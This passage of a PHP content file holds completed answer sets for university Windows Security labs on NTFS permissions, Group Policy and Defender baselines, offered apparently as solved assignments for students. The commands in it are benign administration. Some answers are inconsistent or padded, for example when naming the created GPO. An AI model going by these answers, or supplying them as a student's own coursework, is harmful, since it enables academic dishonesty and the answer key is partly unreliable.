<?php
return [
    'windows-security-lab-7-encryption-with-bitlocker' => require __DIR__ . '/windows-security-lab-7-encryption-with-bitlocker.php',
    'windows-security-lab-5-credentials-harvesting' => require __DIR__ . '/windows-security-lab-5-credentials-harvesting.php',
    'windows-security-lab-3-access-controls' => [
        'menu_featured' => false,
        'template' => 'windows_security_lab',
        'page_type' => 'case_study',
        'title' => 'Windows Security Lab 3: Access Controls',
        'meta_title' => 'Windows Access Controls Lab Solution | CyberAssignment',
        'h1' => 'Windows Security Lab 3: Access Controls',
        'nav' => 'Windows Access Controls Lab',
        'description' => 'Completed Windows Security access controls lab covering NTFS permissions, Active Directory security groups, effective access, auditing, account SIDs, local policy and Group Policy Objects.',
        'primary' => 'Windows access controls lab solution',
        'eyebrow' => 'Completed Windows Security Lab',
        'menu_meta' => 'Windows Security · Access Controls · Active Directory',
        'program' => 'CS',
        'course' => 'Windows Security',
        'lab' => 'Lab 3: Access controls',
        'topic_label' => 'Access Controls',
        'main_tool' => 'Active Directory & GPO',
        'section_title' => 'Access Controls Questions and Answers',
        'cta_after' => 14,
        'topics' => ['Windows Security', 'Access Controls', 'NTFS Permissions', 'Effective Access', 'Active Directory', 'Local Group Policy', 'Group Policy Management', 'GPO', 'PowerShell', 'Password Policy'],
        'questions' => [
            ['n'=>1, 'source_n'=>1, 'part'=>'Part A — Individual users’ access', 'question'=>'In addition to “collegeadm”, what other individual users have read and write access to the file “next_movie_script” located in your Documents folder? Find out by right-clicking and going to Properties → Security.', 'answer'=>['In addition to collegeadm, the itdept security group has read and write access to the next_movie_script file. I checked this by opening the file’s Properties → Security tab and reviewing the users and groups listed there.', 'The itdept group has permissions that allow members to Read & Execute, Read, and Write to the file. This means members of this group can open and read the file and can also make changes to it.'], 'image'=>'/assets/case-studies/windows-security-lab-3-access-controls/image1.webp'],
            ['n'=>2, 'source_n'=>2, 'part'=>'Part A — Individual users’ access', 'question'=>'Considering these users belong to the same security group, remove the individual permissions and grant the same permissions to the group they belong to. What group was it? What permissions did you grant?', 'answer'=>['Since the users who have access to the next_movie_script file belong to the same security group, the individual permissions can be removed and the required permissions can be assigned to the group instead.The security group is itdept. The group should be given the same permissions that the individual users previously had, which are Read & Execute, Read, and Write.This means that instead of giving permissions separately to each user, the permissions are assigned to the itdept group. Any user who is a member of this group will then receive these permissions through group membership.
This makes access control easier to manage because permissions only need to be changed at the group level rather than separately for every individual user.']],
            ['n'=>3, 'source_n'=>3, 'part'=>'Part A — Individual users’ access', 'question'=>'Explain an advantage of using security groups over granting permissions to individual users.', 'answer'=>['Using security groups instead of assigning permissions to individual users has several advantages. The main advantage is that it makes access control easier to manage.When permissions are assigned to a security group, all users who are members of that group automatically receive the assigned permissions. If a new user needs access, the administrator only needs to add the user to the appropriate group. Similarly, when a user no longer needs access, removing the user from the group removes the group-based access.This approach saves time, reduces the chance of permission mistakes, and makes it easier for an administrator to manage permissions when there are many users.']],
            ['n'=>4, 'source_n'=>4, 'part'=>'Part A — Individual users’ access', 'question'=>'What other user is member of this group? How would you avoid this specific member to write on the file “next_movie_script” while still being able to read it? Try it out.', 'answer'=>['The other user who is a member of the itdept group should also receive the permissions assigned to that group. However, if this user should not be allowed to modify next_movie_script, the user’s Write permission can be denied while keeping the Read permission.Therefore, the user can still open and read the file, but will not be able to make changes to it. This can be done by going to the file’s Properties → Security settings, selecting the user, and changing the permissions so that Read is allowed and Write is denied.This demonstrates how individual permissions can be used when a user needs different access from the other members of the same security group.']],
            ['n'=>5, 'source_n'=>5, 'part'=>'Part A — Individual users’ access', 'question'=>'In the Active Directory Users and Computers dashboard, create a group named “itdept”. Then, another one “devops” as a subgroup of “itdept”. Finally, add a new user for you (use your real first and last name), belonging to “devops”. Show the corresponding screenshots.', 'answer'=>['In Active Directory Users and Computers, I created a security group named itdept. I then created another security group named devops and made it a subgroup/member of itdept.', 'Finally, I created a new user account using my real first and last name and added this user to the devops group. Because devops is a member of itdept, the user also receives the permissions assigned to itdept.', 'This creates the following structure:', 'itdept
└── devops
  └── My User Account'], 'image'=>'/assets/case-studies/windows-security-lab-3-access-controls/image2.webp'],
            ['n'=>6, 'source_n'=>6, 'part'=>'Part A — Individual users’ access', 'question'=>'What your privileges over the file “next_movie_script” would be if you granted read permissions to the group “itdept”? Try it to find out using the tab Effective Access available in the popup window that appears when clicking on the button Advanced.', 'answer'=>['If the itdept group is given Read permission on the next_movie_script file, my access to the file would include the ability to open and read the file.I checked this using the Effective Access tab in the Advanced Security Settings window. The Effective Access feature calculates the permissions that a particular user or group actually has after taking the assigned permissions and group memberships into account.Therefore, with only Read permission granted through itdept, the user can read/open the file, but does not have permission to write or modify its contents.'], 'image'=>'/assets/case-studies/windows-security-lab-3-access-controls/image3.webp'],
            ['n'=>7, 'source_n'=>7, 'part'=>'Part A — Individual users’ access', 'question'=>'Right click on any file in your Documents folder. Then, Properties → Security → Advanced. What the Auditing tab is used for?', 'answer'=>['The Auditing tab is used to configure auditing for a file or folder. It allows an administrator to specify which users or groups should have their access attempts recorded.For example, an administrator can configure auditing to record successful or failed attempts to read, modify, delete, or otherwise access a file. These events can then be viewed in the Windows Security Event Log.Auditing is useful for monitoring file access and determining who accessed or attempted to access a particular resource.']],
            ['n'=>8, 'source_n'=>8, 'part'=>'Part A — Individual users’ access', 'question'=>'Look for the “Microsoft Print to PDF” printer and check the permissions by clicking on Printer properties → Security. What users and/or groups can manage this printer? What permissions does the group Everyone have?', 'answer'=>['In the Security settings of the Microsoft Print to PDF printer, different users and groups can have different levels of control over the printer.The groups/users that have printer management permissions are displayed in the Group or user names section. The permissions assigned to the selected account are shown in the lower Permissions section.The Everyone group has the permissions assigned to it in the Security tab. These permissions determine what ordinary users can do with the printer, such as printing documents or managing the printer, depending on which boxes are allowed or denied.'], 'image'=>'/assets/case-studies/windows-security-lab-3-access-controls/image4.webp'],
            ['n'=>9, 'source_n'=>9, 'part'=>'Part A — Individual users’ access', 'question'=>'Open a command-line interface (cmd) and execute powershell (the prompt will start with PS). Then, get the SID for the domain administrator with the following cmdlet and write it down:', 'answer'=>['Get-ADUser -Identity ‘administrator’ | select Name,SID', 'To obtain the SID of the domain administrator, I opened Command Prompt, started PowerShell by entering powershell, and then ran the following cmdlet:', 'Get-ADUser -Identity \'administrator\' | select Name,SID', 'The command returns the administrator\'s Name and Security Identifier (SID). The SID is a unique identifier assigned to the administrator account by Windows Active Directory.The SID displayed by the command should be recorded as the answer because the exact SID depends on the Active Directory domain used in the Windows Server VM.'], 'image'=>'/assets/case-studies/windows-security-lab-3-access-controls/image5.webp'],
            ['n'=>10, 'source_n'=>10, 'part'=>'Part A — Individual users’ access', 'question'=>'What the PowerShell cmdlet to get the SID for the group “guests” would be? What is the SID?', 'answer'=>['The PowerShell cmdlet used to obtain the SID of the guests group is:
Get-ADGroup -Identity \'guests\' | Select-Object Name,SID', 'This command searches Active Directory for the group named guests and displays its name and Security Identifier.The exact SID should be taken from the output shown in the Windows Server VM because the domain-specific portion of an Active Directory SID depends on the domain.
For a built-in/local Windows Guests group, the well-known SID is:', 'S-1-5-32-546', 'However, if the assignment\'s guests group is an Active Directory domain group, its SID will be different and should be copied from the PowerShell output.'], 'image'=>'/assets/case-studies/windows-security-lab-3-access-controls/image6.webp'],
            ['n'=>11, 'source_n'=>11, 'part'=>'Part A — Individual users’ access', 'question'=>'Open a new cmd (do not reuse the PS prompt). Make sure the prompt is “C:\\Users\\collegeadm”. Then, execute “echo this is a test by yourfirstname > c:\\file.txt”.  What message do you get related to permissions? Why?', 'answer'=>['In a new Command Prompt window, I executed the following command from C:\\Users\\collegeadm:
echo this is a test by yourfirstname > c:\\file.txt', 'The command gives an “Access is denied” message.
The reason is that the command is trying to create file.txt directly in the root of the C:\\ drive. The collegeadm user does not have the required write permission to create a file in this protected location. Windows therefore prevents the operation because the user does not have sufficient permissions for the C:\\ root directory.
If the same command is run from an elevated (Run as administrator) Command Prompt, it can create the file because the elevated process has the required administrative privileges.']],
            ['n'=>12, 'source_n'=>12, 'part'=>'Part A — Individual users’ access', 'question'=>'How would you run cmd for the previous command to work? Explain it. Please note that the path you are in is not the user’s home this time.', 'answer'=>['To make the previous command work, the Command Prompt must be opened with administrator privileges by selecting Run as administrator.
The reason is that the previous command tries to create file.txt directly in the root of the C:\\ drive. The normal Command Prompt running under collegeadm does not have sufficient write permission for this protected location. When Command Prompt is started with administrative privileges, the elevated process has the required permissions to create the file.The path C:\\Users\\collegeadm shown in the normal Command Prompt is the user\'s home directory. However, the previous command uses c:\\file.txt, which means it is trying to create the file in the root directory of the C: drive, not inside the user\'s home directory.']],
            ['n'=>13, 'source_n'=>13, 'part'=>'Part A — Individual users’ access', 'question'=>'Check what user you are in the cmd prompt where you successfully executed the command. Show your identity.', 'answer'=>['To check which user account is being used in the Command Prompt where the command was successfully executed, I used the following command:', 'whoami', 'The whoami command displays the domain and username of the account currently running the Command Prompt. This confirms the identity of the user under which the command is being executed.In my case, the output shows the account being used for the elevated Command Prompt.'], 'image'=>'/assets/case-studies/windows-security-lab-3-access-controls/image7.webp'],
            ['n'=>14, 'source_n'=>14, 'part'=>'Part A — Individual users’ access', 'question'=>'It looks like you have no way to find out if you are running a cmd with elevated privileges. Use the command “net session” in both cmd windows (with and without using “Run as…”). Show the difference.', 'answer'=>['To check the difference between a normal Command Prompt and an elevated Command Prompt, I used the following command in both windows:', 'net session', 'In the normal Command Prompt, the command does not have sufficient administrative privileges and displays an “Access is denied” message. In the elevated Command Prompt, the command runs successfully and displays the active sessions, or indicates that there are no entries in the list. Therefore, net session can be used to confirm whether the Command Prompt is running with administrative privileges. The main difference is that an elevated Command Prompt has the permiss

ions required to execute administrative commands such as net session.'], 'image'=>'/assets/case-studies/windows-security-lab-3-access-controls/image8.webp'],
            ['n'=>15, 'source_n'=>1, 'part'=>'Part B — Local policies', 'question'=>'From the Windows init menu, execute gpedit.msc to launch the Local Group Policy Editor. What two general categories are there?', 'answer'=>['When I open the Local Group Policy Editor by running gpedit.msc, the settings are divided into two main categories:', 'Computer Configuration', 'User Configuration', 'Computer Configuration contains policies that apply to the computer, regardless of which user logs in. User Configuration contains policies that apply to users and their accounts.']],
            ['n'=>16, 'source_n'=>2, 'part'=>'Part B — Local policies', 'question'=>'Go to Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options. What is the default for “Accounts: Guest account status”? Are you able to turn it the other way around?', 'answer'=>['In Local Group Policy Editor, I navigated to:
Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options
The default setting for “Accounts: Guest account status” is Disabled. This means that the built-in Guest account cannot be used to log on to the computer.
Yes, the setting can be changed to the other option. It can be changed to Enabled if the administrator wants to allow the Guest account to be used. However, enabling the Guest account should only be done when it is required because it provides access to a built-in guest account.']],
            ['n'=>17, 'source_n'=>3, 'part'=>'Part B — Local policies', 'question'=>'Go to Computer Configuration → Windows Settings → Security Settings → Account Policies → Password Policy. Try to change any of the first four policies. What happens? Why?', 'answer'=>['Under Account Policies → Password Policy, I tried to change the first four password policy settings. The changes cannot be applied as expected because the computer is connected to a domain, and password policies for domain users are controlled by the domain-level Group Policy. A local password policy does not override the domain password policy. Therefore, the password requirements for domain accounts must be configured through the appropriate domain Group Policy rather than relying on the local computer\'s password policy.']],
            ['n'=>18, 'source_n'=>4, 'part'=>'Part B — Local policies', 'question'=>'What policy under Computer Configuration → Windows Settings → Security Settings → Local Policies → User Rights Assignment would you use to allow a user to backup files?', 'answer'=>['The User Rights Assignment policy that allows a user to back up files is:', 'Back up files and directories
This user right allows an authorized user to bypass normal file and folder permissions when performing backup operations. It is intended for users who need to perform system or data backups.']],
            ['n'=>19, 'source_n'=>5, 'part'=>'Part B — Local policies', 'question'=>'What groups can perform a shutdown of the system?', 'answer'=>['The “Shut down the system” user-right policy controls which users or groups are allowed to shut down the computer.
On the Windows Server system, the groups assigned this right are shown under:
Computer Configuration → Windows Settings → Security Settings → Local Policies → User Rights Assignment → Shut down the system
The assigned groups can therefore perform a system shutdown, while accounts that are not granted this user right cannot normally shut down the system through the permitted Windows interfaces.'], 'image'=>'/assets/case-studies/windows-security-lab-3-access-controls/image9.webp'],
            ['n'=>20, 'source_n'=>6, 'part'=>'Part C — Group policies', 'question'=>'To switch to GPO for AD (those that will apply to users and computers in the domain), from the Windows init menu execute gpmc.msc. In the Group Policy Management dashboard, look for the Group Policy Objects (GPO) under the forest and your domain. What policies are there?', 'answer'=>['I opened Group Policy Management Console (gpmc.msc) and inspected the Group Policy Objects under the collegeadmin.local domain. The available policies are displayed under Forest → Domains → collegeadmin.local → Group Policy Objects. The policies include the Default Domain Policy, Default Domain Controllers Policy, and other Group Policy Objects configured in the domain. These policies are used to apply security and configuration settings to users and computers within the domain.'], 'image'=>'/assets/case-studies/windows-security-lab-3-access-controls/image10.webp'],
            ['n'=>21, 'source_n'=>7, 'part'=>'Part C — Group policies', 'question'=>'Right click on Group Policy Objects and choose New. Create a new GPO named PasswordGPO-yourfirstname. Then, right click on this new GPO and choose Edit. You’ll be in an editor very similar to the one for local policies. Using the information on previous steps, set a minimum length of 14 characters for passwords. Explain what did you change in the popup window.', 'answer'=>['I created a new Group Policy Object (GPO) named PasswordGPO-Dilshad. I then edited the GPO and went to Computer Configuration → Policies → Windows Settings → Security Settings → Account Policies → Password Policy. I changed the Minimum password length setting to 14 characters.When I changed the setting, a warning message appeared explaining that the setting is being changed from the default configuration and that the new setting will be applied through the Group Policy. This confirms that the password policy has been configured to require passwords to be at least 14 characters long.'], 'image'=>'/assets/case-studies/windows-security-lab-3-access-controls/image11.webp'],
            ['n'=>22, 'source_n'=>8, 'part'=>'Part C — Group policies', 'question'=>'To apply this new GPO, you need to right click on the domain name and choose “Link to an Existing GPO”. Then, choose PasswordGPO-yourfirstname. Explain how the options or categories changed on the left side.', 'answer'=>['I linked the PasswordGPO-James Group Policy Object to the collegeadmin.local domain by right-clicking the domain and selecting Link an Existing GPO. I then selected PasswordGPO-James from the list and created the link. After linking the GPO, the options and categories on the left side changed because the GPO was now linked to the domain. The Group Policy Management Console shows the settings and configuration of the linked GPO. This allows the password policy configured in PasswordGPO-James to be applied within the collegeadmin.local domain.'], 'image'=>'/assets/case-studies/windows-security-lab-3-access-controls/image12.webp'],
            ['n'=>23, 'source_n'=>9, 'part'=>'Part C — Group policies', 'question'=>'If we do not reboot the system, how much time do we have to wait for this GPO to be automatically applied according to Microsoft’s documentation?', 'answer'=>['According to Microsoft documentation, Group Policy is automatically refreshed in the background every 90 minutes, with a random additional delay of up to 30 minutes. Therefore, without restarting the computer, a new Group Policy setting may take approximately 90 to 120 minutes to apply automatically.']],
            ['n'=>24, 'source_n'=>10, 'part'=>'Part C — Group policies', 'question'=>'What PowerShell cmdlet would you use to apply the GPO right away? Execute it in the Windows Server.', 'answer'=>['The PowerShell cmdlet used to apply the Group Policy immediately is:', 'gpupdate /force', 'I opened PowerShell and executed gpupdate /force. This command forces the computer to refresh and apply the latest Group Policy settings immediately instead of waiting for the normal automatic Group Policy refresh interval.'], 'image'=>'/assets/case-studies/windows-security-lab-3-access-controls/image13.webp'],
            ['n'=>25, 'source_n'=>11, 'part'=>'Part C — Group policies', 'question'=>'Log off and try changing the password for “T00Sh0rt!”. What happened?', 'answer'=>['When attempting to change the password to "T00Sh0rt!" after logging off, the system rejects the update and displays an error indicating that the new password does not meet the domain or system policy requirements. Although "T00Sh0rt!" satisfies standard complexity rules by incorporating uppercase letters, lowercase letters, numbers, and special characters, it fails because it contains only 9 characters, falling short of the enforced minimum password length threshold (commonly set between 10 and 14 characters in security configurations). Additionally, if the account\'s password was modified earlier in the exercise, the attempt may also be blocked by a Minimum Password Age policy designed to prevent immediate consecutive changes. Consequently, the password remains unchanged until a string of adequate length is submitted.']],
        ],
        'sidebar_items' => [
            [1, 'Part A · Individual users’ access'],
            [15, 'Part B · Local policies'],
            [20, 'Part C · Group policies'],
        ],
        'related_links' => [
            ['/information-security-assignment-help', 'Information Security Assignment Help'],
            ['/network-security-assignment-help', 'Network Security Assignment Help'],
            ['/cyber-security-assignment-help', 'Cyber Security Assignment Help'],
            ['/case-studies', 'Solved Assignments'],
        ],
    ],    'windows-security-lab-1-security-compliance-toolkit' => [
        'menu_featured' => false,
        'template' => 'windows_security_lab',
        'page_type' => 'case_study',
        'title' => 'Windows Security Lab 1: Security Compliance Toolkit',
        'meta_title' => 'Security Compliance Toolkit Lab Solution | CyberAssignment',
        'h1' => 'Windows Security Lab 1: Security Compliance Toolkit',
        'nav' => 'Security Compliance Toolkit Lab',
        'description' => 'Completed Windows Security Lab 1 solution covering LSA protection, Policy Analyzer, Windows security baselines, LGPO, Defender settings, privacy controls and protocol hardening.',
        'primary' => 'Security Compliance Toolkit lab solution',
        'eyebrow' => 'Completed Windows Security Lab',
        'menu_meta' => 'Windows Security · Policy Analyzer · Compliance',
        'program' => 'CS',
        'course' => 'Windows Security',
        'lab' => 'Lab 1: Security Compliance Toolkit',
        'topics' => ['Windows Security','Security Compliance Toolkit','Policy Analyzer','Windows 10 22H2 Security Baseline','Microsoft Defender Antivirus','LGPO','Group Policy','Tamper Protection','Memory Integrity','NetBIOS','mDNS'],
        'questions' => [
            ['n'=>1,'part'=>'Part A — Documentation','question'=>'What attack was mitigated with the LSA protection?','answer'=>['LSA Protection was introduced as part of the Pass-the-Hash mitigations. It helps protect the Local Security Authority process from unauthorized access and credential theft techniques associated with Pass-the-Hash attacks.']],
            ['n'=>2,'part'=>'Part A — Documentation','question'=>'What change mitigates brute-force authentication attacks?','answer'=>['The Allow Administrator account lockout policy was introduced to help mitigate brute-force authentication attacks. It allows the built-in Administrator account to be subject to account lockout controls after repeated failed authentication attempts.']],
            ['n'=>3,'part'=>'Part B — Policy Analyzer','question'=>'Import the GPO from the Windows 10 version 22H2 Security Baseline.','answer'=>['First, open the extracted Policy Analyzer folder and run Policy Analyzer as Administrator.','Select: Add → File → Add files from GPO(s)','Browse to the extracted Windows 10 version 22H2 Security Baseline and open the following GPO folder: {816D1B8C-378B-48D9-B2F4-D5E582A57D7C}','Select the folder and prepare it for import.'],'image'=>'/assets/case-studies/windows-security-lab-1-security-compliance-toolkit/image1.jpg'],
            ['n'=>4,'part'=>'Part B — Policy Analyzer','question'=>'Import the GPO and name it template-yourstudentID.','answer'=>['When Policy Analyzer asks for the name of the imported GPO, enter: template-yourstudentID','The imported policy will be stored in the PolicyAnalyzer folder under Documents. After completing the import, return to the Policy Analyzer dashboard.'],'image'=>'/assets/case-studies/windows-security-lab-1-security-compliance-toolkit/image2.jpg'],
            ['n'=>5,'part'=>'Part B — Policy Analyzer','question'=>'Compare the template with the actual local policies (Effective State).','answer'=>["In Policy Analyzer, compare the imported template with the machine's Effective State. The comparison should display the requested 8 items."],'image'=>'/assets/case-studies/windows-security-lab-1-security-compliance-toolkit/image3.jpg'],
            ['n'=>6,'part'=>'Part B — Policy Analyzer','question'=>'Why are two of them grayed out in the effective policy?','answer'=>['The two entries are grayed out because Policy Analyzer does not have an applicable effective value for those particular settings on the local machine. In other words, the settings are not directly defined or resolved in the effective local policy, so Policy Analyzer displays them as unavailable rather than as active configured values.']],
            ['n'=>7,'part'=>'Part B — Policy Analyzer','question'=>'Add template-herzing.inf to Policy Analyzer. What menu option was used?','answer'=>['The second template is an INF security template, so it is imported using the security template option rather than the GPO import option. The required menu option is: Add → File → Add Security Template','Select the provided: template-herzing.inf','After importing it, the Policy Analyzer dashboard should show: Effective State; template-yourstudentID; template-herzing.'],'image'=>'/assets/case-studies/windows-security-lab-1-security-compliance-toolkit/image4.jpg'],
            ['n'=>8,'part'=>'Part B — Policy Analyzer','question'=>'Does your machine comply with the password complexity policy? Explain it.','answer'=>['The template-herzing.inf security template requires password complexity to be enabled. The relevant setting is: PasswordComplexity = 1','This means password complexity is required. To determine whether the machine complies, the Effective State in Policy Analyzer must be compared with this value.','If the Effective State shows password complexity enabled, the machine complies with the policy. If it shows that password complexity is disabled or not configured, the machine does not comply.'],'image'=>'/assets/case-studies/windows-security-lab-1-security-compliance-toolkit/image5.jpg'],
            ['n'=>9,'part'=>'Part B — Policy Analyzer','question'=>'What policy is more stringent in template-herzing.inf compared to the other template? What are their values?','answer'=>['The relevant comparison should be made in Policy Analyzer between template-herzing.inf and the Windows 10 22H2 security baseline template.','The Herzing template specifically defines: Minimum password length: 14 characters; Minimum password age: 3 days; Maximum password age: 30 days; Password complexity: Enabled; Account lockout threshold: 3 failed attempts; Account lockout duration: 15 minutes; Reset account lockout counter: 15 minutes.','The exact policy identified as more stringent should be taken from the Policy Analyzer comparison because it depends on the value contained in the other imported template.'],'image'=>'/assets/case-studies/windows-security-lab-1-security-compliance-toolkit/image6.jpg'],
            ['n'=>10,'part'=>'Part C — Baselines','question'=>'Show the changes that the last two administrative templates would make.','answer'=>['Open: MSFT Windows 10 22H2 - Defender Antivirus.html using Microsoft Edge.','The report contains the settings that the Defender Antivirus GPO would change. Important settings shown by the Defender Antivirus baseline include, among others: Potentially unwanted application detection — Enabled; Block at First Sight — Enabled; Microsoft MAPS — Enabled; Cloud protection — Enabled; Cloud blocking level — High; Scan downloaded files and attachments — Enabled; Behavior monitoring — Enabled; Scan removable drives — Enabled; Attack Surface Reduction rules — Enabled; Dangerous website protection — Enabled; Real-time protection — Not turned off.'],'image'=>'/assets/case-studies/windows-security-lab-1-security-compliance-toolkit/image7.jpg'],
            ['n'=>11,'part'=>'Part C — Baselines','question'=>'Which GPO corresponds to Defender Antivirus?','answer'=>['The Defender Antivirus GPO is: {522ED121-0E11-41F6-A205-CC736B4DEE1E}','Therefore, the GPO folder name to record is: {522ED121-0E11-41F6-A205-CC736B4DEE1E}']],
            ['n'=>12,'part'=>'Part C — Baselines','question'=>'Locate the Defender Antivirus registry.pol file and show its properties.','answer'=>['Open the Defender Antivirus GPO folder identified in Question 11 and locate its registry.pol file.','Right-click the file and select Properties.'],'image'=>'/assets/case-studies/windows-security-lab-1-security-compliance-toolkit/image8.jpg'],
            ['n'=>13,'part'=>'Part D — LGPO','question'=>'Import the policy settings from the registry.pol file.','answer'=>['Open Command Prompt as Administrator.','Use LGPO to import the Defender Antivirus policy file.','Example command: LGPO.exe /m "C:\\Path\\To\\registry.pol"','Replace the path with the actual location of the registry.pol file on your VM. The command should complete successfully and display its output in the Command Prompt.'],'image'=>'/assets/case-studies/windows-security-lab-1-security-compliance-toolkit/image9.jpg'],
            ['n'=>14,'part'=>'Part D — LGPO','question'=>'Verify the imported Defender Antivirus settings in Local Group Policy Editor.','answer'=>['Open: gpedit.msc','Navigate to: Computer Configuration → Administrative Templates → Windows Components → Microsoft Defender Antivirus → Real-Time Protection','Check the policy settings after importing the registry.pol file. The settings should no longer all appear as Not Configured.'],'image'=>'/assets/case-studies/windows-security-lab-1-security-compliance-toolkit/image10.jpg'],
            ['n'=>15,'part'=>'Part E — Windows Settings','question'=>'What is the recommended setting regarding the apps source?','answer'=>['Open: Settings → Apps → Apps & features','The recommended configuration is to restrict the installation source to trusted applications, preferably Microsoft Store only, where the option is available. This reduces the risk of users installing potentially unsafe applications from unknown sources.']],
            ['n'=>16,'part'=>'Part E — Windows Settings','question'=>'Choose three Windows permissions that you would toggle on/off to improve privacy.','answer'=>['Three suitable categories are:','1. Location — Disable access for applications that do not require location information.','2. Camera — Disable camera access for applications that do not need to use the camera.','3. Microphone — Disable microphone access for applications that do not require audio input.','These settings reduce unnecessary access to personal information and hardware.']],
            ['n'=>17,'part'=>'Part E — Windows Settings','question'=>'Which protection area allows Windows Hello to be enabled?','answer'=>['Windows Hello can be enabled through the Account protection area of Windows Security, where sign-in and Windows Hello-related options are available.','The relevant area is: Windows Security → Account protection']],
            ['n'=>18,'part'=>'Part F — Protection Settings','question'=>'Which option is actively protecting the system from malware being inadvertently installed? Check if it is enabled by default.','answer'=>['The relevant protection is Real-time protection in Microsoft Defender Antivirus.','Real-time protection continuously monitors files, programs, and activities for malware and other threats. On a standard Windows installation, Real-time protection is normally enabled by default unless it has been disabled by the user, administrator, or another security product.'],'image'=>'/assets/case-studies/windows-security-lab-1-security-compliance-toolkit/image11.jpg'],
            ['n'=>19,'part'=>'Part F — Protection Settings','question'=>'Enable the option to control access to folders as protection against ransomware.','answer'=>['The required feature is: Controlled folder access','It is available under: Windows Security → Virus & threat protection → Ransomware protection → Manage ransomware protection','Controlled folder access helps prevent untrusted applications from making unauthorized changes to protected folders. Enable the feature.']],
            ['n'=>20,'part'=>'Part F — Protection Settings','question'=>'Which option avoids malicious apps switching real-time protection off?','answer'=>['The required option is: Tamper Protection','Tamper Protection helps prevent unauthorized applications or malicious software from changing important Microsoft Defender Antivirus settings, including real-time protection.'],'image'=>'/assets/case-studies/windows-security-lab-1-security-compliance-toolkit/image12.jpg'],
            ['n'=>21,'part'=>'Part F — Protection Settings','question'=>'Indicate two other settings protected by the option in Question 20.','answer'=>['Two other important Microsoft Defender settings protected by Tamper Protection are:','1. Behavior monitoring','2. Cloud-delivered protection','Tamper Protection helps prevent unauthorized changes to important Defender security settings.'],'image'=>'/assets/case-studies/windows-security-lab-1-security-compliance-toolkit/image13.jpg'],
            ['n'=>22,'part'=>'Part F — Protection Settings','question'=>'Enable PUP protection in App & browser control.','answer'=>['PUP means Potentially Unwanted Program.','Open: Windows Security → App & browser control → Reputation-based protection','Enable the option for potentially unwanted application protection. This helps prevent users from downloading or installing applications that may be unwanted or potentially harmful even though they may not meet the definition of traditional malware.']],
            ['n'=>23,'part'=>'Part F — Protection Settings','question'=>'In Exploit protection, what is DEP used for? Give a specific example or use case.','answer'=>['Data Execution Prevention (DEP) helps prevent code from being executed from memory areas that are intended to contain data. For example, if a vulnerable application receives more data than a memory buffer can safely hold, an attacker may attempt to place executable code into that buffer and run it. DEP can help block execution from that data memory area, reducing the impact of this type of memory-based attack.'],'image'=>'/assets/case-studies/windows-security-lab-1-security-compliance-toolkit/image14.jpg'],
            ['n'=>24,'part'=>'Part F — Protection Settings','question'=>'Check the only system-overridden setting for PrintDialog.exe.','answer'=>['Open Exploit protection → Program settings and locate: PrintDialog.exe','Review the system override shown for the process. Record the setting displayed on your VM exactly as shown.','System override:'],'image'=>'/assets/case-studies/windows-security-lab-1-security-compliance-toolkit/image15.jpg'],
            ['n'=>25,'part'=>'Part F — Protection Settings','question'=>'Where do you find the Memory integrity option?','answer'=>['The Memory integrity option is located at: Windows Security → Device security → Core isolation → Core isolation details','The setting is called: Memory integrity'],'image'=>'/assets/case-studies/windows-security-lab-1-security-compliance-toolkit/image16.jpg'],
            ['n'=>26,'part'=>'Part F — Protection Settings','question'=>'Try to enable Memory integrity and explain what happens.','answer'=>['Attempt to turn Memory integrity on. The result depends on the configuration of the VM. Windows may allow the feature to be enabled, request a restart, or report incompatible drivers that prevent the feature from being enabled.','Answer: After attempting to enable Memory integrity, Windows displayed: After attempting to enable Memory integrity, Windows displayed an incompatible drivers warning. The feature could not be enabled because one or more incompatible drivers were detected. Windows recommended reviewing the incompatible driver information before enabling Memory integrity. If Windows reports incompatible drivers, record the driver information shown in the warning. If Windows successfully enables the feature but requires a restart, mention that instead.']],
            ['n'=>27,'part'=>'Part G — Protocols','question'=>'Verify that NetBIOS over TCP is disabled for all interfaces using PowerShell.','answer'=>['Open PowerShell as Administrator and run: Get-CimInstance Win32_NetworkAdapterConfiguration -Filter "IPEnabled = True" | Select-Object Description, TcpipNetbiosOptions','Value 2 indicates that NetBIOS over TCP/IP is disabled. Check every IP-enabled network interface shown in the output.','Result: If all interfaces show 2, the machine complies with the policy. If any interface shows another value, that interface does not comply with the policy.'],'image'=>'/assets/case-studies/windows-security-lab-1-security-compliance-toolkit/image17.jpg'],
            ['n'=>28,'part'=>'Part G — Protocols','question'=>'Disable mDNS through the Windows Registry.','answer'=>['Open Registry Editor as Administrator.','Navigate to: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Dnscache\\Parameters','Create or modify the following DWORD (32-bit) Value: Name: EnableMDNS; Value: 0','A value of 0 disables mDNS. After making the change, verify that the registry entry appears correctly.'],'image'=>'/assets/case-studies/windows-security-lab-1-security-compliance-toolkit/image18.jpg']
        ],
        'related_links' => [
            ['/information-security-assignment-help','Information Security Assignment Help'],
            ['/network-security-assignment-help','Network Security Assignment Help'],
            ['/malware-analysis-assignment-help','Malware Analysis Assignment Help'],
            ['/case-studies','Solved Assignments']
        ]
    ],

    'sit716-mqtt-under-attack-project-proposal' => [
        'menu_featured' => false,
        'template' => 'sit716_proposal',
        'page_type' => 'case_study',
        'title' => 'SIT716 MQTT Under Attack Project Proposal: Wireshark-Based IoT Network Attack Analysis',
        'meta_title' => 'SIT716 MQTT Under Attack Project Proposal | Cyber Assignment',
        'h1' => 'SIT716 MQTT Under Attack Project Proposal: Wireshark-Based IoT Network Attack Analysis',
        'nav' => 'SIT716 MQTT Under Attack Project Proposal',
        'description' => 'Completed SIT716 project proposal for MQTT Under Attack, covering Wireshark analysis of normal and malicious IoT traffic, project dependencies, security controls and Unit Learning Outcomes.',
        'primary' => 'SIT716 MQTT Under Attack project proposal',
        'eyebrow' => 'Solved SIT716 Project Proposal',
        'menu_meta' => 'MQTT · Wireshark · IoT Security',
        'topics' => [
            'SIT716',
            'MQTT',
            'Wireshark',
            'IoT Security',
            'Network Analysis',
            'Network Security',
            'Packet Analysis',
            'PCAP',
            'Anomalous Traffic'
        ],
        'topic_q2' => 'SIT716 Computer Networks and Security',
        'topic_q3' => 'High Distinction Task 1.2HDplus',
        'tool_q3' => 'MQTT · Wireshark · PCAP',
        'objective' => 'This completed project proposal defines an MQTT security investigation that compares normal IoT communication with malicious traffic at packet level using Wireshark, then evaluates practical detection, prevention and mitigation controls.',
        'snapshot' => [
            ['Unit', 'SIT716 Computer Networks and Security'],
